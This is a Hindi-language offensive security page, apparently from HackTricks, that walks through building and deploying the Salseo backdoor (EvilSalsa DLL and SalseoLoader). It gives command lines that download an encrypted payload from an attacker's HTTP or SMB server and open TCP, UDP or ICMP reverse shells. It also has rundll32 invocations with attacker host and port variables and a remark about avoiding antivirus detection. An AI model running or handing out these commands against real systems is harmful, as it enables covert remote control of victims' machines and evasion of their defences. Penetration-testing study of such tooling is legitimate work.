# Salseo

{{#include ../banners/hacktricks-training.md}}

## बाइनरी को संकलित करना

गिटहब से स्रोत कोड डाउनलोड करें और **EvilSalsa** और **SalseoLoader** को संकलित करें। आपको कोड संकलित करने के लिए **Visual Studio** स्थापित करने की आवश्यकता होगी।

उन परियोजनाओं को उस विंडोज बॉक्स की आर्किटेक्चर के लिए संकलित करें जहाँ आप उनका उपयोग करने जा रहे हैं (यदि विंडोज x64 का समर्थन करता है तो उन्हें उस आर्किटेक्चर के लिए संकलित करें)।

आप **Visual Studio** में **बाएं "Build" टैब** में **"Platform Target"** के अंदर **आर्किटेक्चर का चयन** कर सकते हैं।

(**यदि आप ये विकल्प नहीं पा रहे हैं तो **"Project Tab"** पर क्लिक करें और फिर **"\<Project Name> Properties"** पर क्लिक करें)

![](<../images/image (132).png>)

फिर, दोनों परियोजनाओं का निर्माण करें (Build -> Build Solution) (लॉग के अंदर निष्पादन योग्य का पथ दिखाई देगा):

![](<../images/image (1) (2) (1) (1) (1).png>)

## बैकडोर तैयार करें

सबसे पहले, आपको **EvilSalsa.dll** को एन्कोड करने की आवश्यकता होगी। ऐसा करने के लिए, आप पायथन स्क्रिप्ट **encrypterassembly.py** का उपयोग कर सकते हैं या आप परियोजना **EncrypterAssembly** को संकलित कर सकते हैं:

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### विंडोज
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
ठीक है, अब आपके पास Salseo चीज़ को निष्पादित करने के लिए सब कुछ है: **encoded EvilDalsa.dll** और **SalseoLoader का बाइनरी।**

**SalseoLoader.exe बाइनरी को मशीन पर अपलोड करें। उन्हें किसी भी AV द्वारा नहीं पहचाना जाना चाहिए...**

## **बैकडोर निष्पादित करें**

### **TCP रिवर्स शेल प्राप्त करना (HTTP के माध्यम से एन्कोडेड dll डाउनलोड करना)**

याद रखें कि रिवर्स शेल लिस्नर के रूप में nc शुरू करें और एन्कोडेड evilsalsa को सर्व करने के लिए एक HTTP सर्वर शुरू करें।
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **UDP रिवर्स शेल प्राप्त करना (SMB के माध्यम से एन्कोडेड dll डाउनलोड करना)**

याद रखें कि रिवर्स शेल श्रोता के रूप में एक nc शुरू करें, और एन्कोडेड evilsalsa (impacket-smbserver) को सेवा देने के लिए एक SMB सर्वर शुरू करें।
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **ICMP रिवर्स शेल प्राप्त करना (कोडित dll पहले से पीड़ित के अंदर)**

**इस बार आपको क्लाइंट में रिवर्स शेल प्राप्त करने के लिए एक विशेष उपकरण की आवश्यकता है। डाउनलोड करें:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **ICMP उत्तर बंद करें:**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### क्लाइंट को निष्पादित करें:
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### पीड़ित के अंदर, चलो salseo चीज़ को निष्पादित करते हैं:
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## SalseoLoader को DLL के रूप में संकलित करना जो मुख्य फ़ंक्शन को निर्यात करता है

SalseoLoader प्रोजेक्ट को Visual Studio में खोलें।

### मुख्य फ़ंक्शन से पहले जोड़ें: \[DllExport]

![](<../images/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

### इस प्रोजेक्ट के लिए DllExport स्थापित करें

#### **Tools** --> **NuGet Package Manager** --> **Manage NuGet Packages for Solution...**

![](<../images/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

#### **DllExport पैकेज के लिए खोजें (Browse टैब का उपयोग करते हुए), और Install दबाएं (और पॉपअप को स्वीकार करें)**

![](<../images/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

आपके प्रोजेक्ट फ़ोल्डर में फ़ाइलें दिखाई दी हैं: **DllExport.bat** और **DllExport_Configure.bat**

### **U**ninstall DllExport

**Uninstall** दबाएं (हाँ, यह अजीब है लेकिन मुझ पर विश्वास करें, यह आवश्यक है)

![](<../images/image (5) (1) (1) (2) (1).png>)

### **Visual Studio से बाहर निकलें और DllExport_configure निष्पादित करें**

बस **बाहर निकलें** Visual Studio से

फिर, अपने **SalseoLoader फ़ोल्डर** में जाएं और **DllExport_Configure.bat** निष्पादित करें

**x64** चुनें (यदि आप इसे x64 बॉक्स के अंदर उपयोग करने जा रहे हैं, तो यह मेरा मामला था), **System.Runtime.InteropServices** चुनें ( **DllExport के लिए Namespace के अंदर**) और **Apply** दबाएं

![](<../images/image (7) (1) (1) (1) (1).png>)

### **Visual Studio के साथ प्रोजेक्ट फिर से खोलें**

**\[DllExport]** अब त्रुटि के रूप में चिह्नित नहीं होना चाहिए

![](<../images/image (8) (1).png>)

### समाधान का निर्माण करें

**Output Type = Class Library** चुनें (Project --> SalseoLoader Properties --> Application --> Output type = Class Library)

![](<../images/image (10) (1).png>)

**x64** **प्लेटफ़ॉर्म** चुनें (Project --> SalseoLoader Properties --> Build --> Platform target = x64)

![](<../images/image (9) (1) (1).png>)

**समाधान** का निर्माण करने के लिए: Build --> Build Solution (Output कंसोल के अंदर नए DLL का पथ दिखाई देगा)

### उत्पन्न Dll का परीक्षण करें

Dll को उस स्थान पर कॉपी और पेस्ट करें जहाँ आप इसका परीक्षण करना चाहते हैं।

निष्पादित करें:
```
rundll32.exe SalseoLoader.dll,main
```
यदि कोई त्रुटि नहीं आती है, तो शायद आपके पास एक कार्यात्मक DLL है!!

## DLL का उपयोग करके एक शेल प्राप्त करें

**HTTP** **सर्वर** का उपयोग करना न भूलें और एक **nc** **श्रोता** सेट करें

### पॉवरशेल
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
{{#include ../banners/hacktricks-training.md}}
